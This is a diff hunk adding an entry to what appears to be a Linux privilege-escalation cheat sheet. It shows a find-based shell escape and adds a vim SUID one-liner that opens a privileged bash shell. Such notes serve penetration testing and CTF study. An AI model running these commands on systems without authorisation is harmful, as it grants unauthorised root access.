@@ -135,6 +135,12 @@ Example:
 find . -exec /bin/sh \; -quit
 ```
 
+vim suid privilege escalation
+
+```
+/usr/bin/vim -c ':set shell=/bin/bash\ -p' -c ':shell'
+```
+
 ---
 
 # 4. Writable Files
